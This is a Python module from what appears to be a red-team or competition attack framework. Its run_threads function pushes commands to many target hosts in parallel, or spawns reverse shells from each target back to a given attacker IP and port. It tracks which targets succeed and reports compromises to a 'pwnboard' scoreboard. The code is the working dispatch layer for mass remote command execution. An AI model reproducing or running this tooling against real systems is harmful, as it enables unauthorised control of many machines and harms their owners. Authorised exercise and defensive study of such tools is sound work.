import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.console import Console
from Server.config_loader import CONFIG
from Server.shell import spawn_reverse_shell
from Server.callbacks import process_callbacks
from Server.display import display_results
from Server.execute import send_command

console = Console()

def run_threads(clients, port, command, action_type="command", attacker_ip=None, attacker_port=None, callback=False):
    console.print(f"\n[bold #00ff00]Executing on {len(clients)} targets...[/bold #00ff00]")
    console.print("=" * 60)
    
    results = []
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
        transient=True,
    ) as progress:
        
        main_task = progress.add_task(f"[#00ff00]Processing {len(clients)} targets...", total=len(clients))
        
        with ThreadPoolExecutor(max_workers=CONFIG.other.CONCURRENCY) as ex:
            futures = {}
            for client in clients:
                if action_type == "command" and callback == True:
                    future = ex.submit(send_command, client, port, command, callback)
                elif action_type == "command":
                    future = ex.submit(send_command, client, port, command)
                else:  # shell
                    future = ex.submit(spawn_reverse_shell, client, port, attacker_ip, attacker_port)
                futures[future] = client
                time.sleep(CONFIG.other.THROTTLE_MS / 1000.0)
            
            for future in as_completed(futures):
                client = futures[future]
                try:
                    result = future.result()
                    if action_type == "command":
                        target, status, response = result
                    else:
                        # spawn_reverse_shell returns different format
                        if len(result) == 3:
                            target, status, response = result
                        else:
                            status, response = result
                            target = client
                    
                    # Determine status color and icon
                    if status == 200 or status == "SUCCESS":
                        status_color = "#00ff00"  # Green
                        status_icon = "✅"
                        status_text = "SUCCESS"
                    elif isinstance(status, int) and 400 <= status < 600:
                        status_color = "#ff0000"  # Red
                        status_icon = "❌"
                        status_text = f"ERROR {status}"
                    else:
                        status_color = "#ffff00"  # Yellow
                        status_icon = "⚠️"
                        status_text = f"FAILED: {status}"
                    
                    results.append({
                        "target": target,
                        "status": status_text,
                        "color": status_color,
                        "icon": status_icon,
                        "response": response
                    })
                    
                except Exception as e:
                    results.append({
                        "target": client,
                        "status": f"EXCEPTION: {str(e)}",
                        "color": "#ff0000",
                        "icon": "💥",
                        "response": ""
                    })
                
                progress.update(main_task, advance=1)
    
    # Send successful callbacks data to fwd_pwnboard
    if callback:
        process_callbacks(results)
    else:
        # Display results in an appealing way
        display_results(results, action_type)